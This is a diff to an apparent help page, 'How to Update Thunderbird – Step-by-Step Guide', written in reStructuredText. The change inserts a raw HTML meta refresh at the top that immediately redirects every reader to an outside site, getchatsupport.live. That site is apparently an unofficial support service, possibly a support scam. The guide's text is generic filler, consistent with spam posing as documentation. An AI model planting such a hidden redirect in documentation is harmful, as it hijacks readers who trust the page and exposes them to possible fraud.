@@ -1,8 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
+
 How to Update Thunderbird – Step-by-Step Guide
 ============================================
-
-
-
 
 Mozilla Thunderbird is one of the most widely used open-source email clients available today. Known for its robust features, high security standards, and customizability, Thunderbird has become a popular choice for users who prefer a desktop-based email client over web-based options. The Thunderbird update system ensures that users are constantly equipped with the latest features, improvements, and security patches to keep their email experience seamless.
 
